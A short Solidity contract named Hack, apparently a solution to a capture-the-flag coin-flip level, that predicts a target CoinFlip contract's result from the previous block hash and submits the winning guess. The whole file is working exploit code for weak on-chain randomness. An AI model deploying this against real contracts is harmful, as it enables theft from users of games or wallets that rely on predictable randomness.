//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "contracts/level3.sol";

contract Hack {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip target = CoinFlip(0x36ce7540571705D1168740b92d1ce0f0fAe95Cdf);

    // call this function 10 times
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}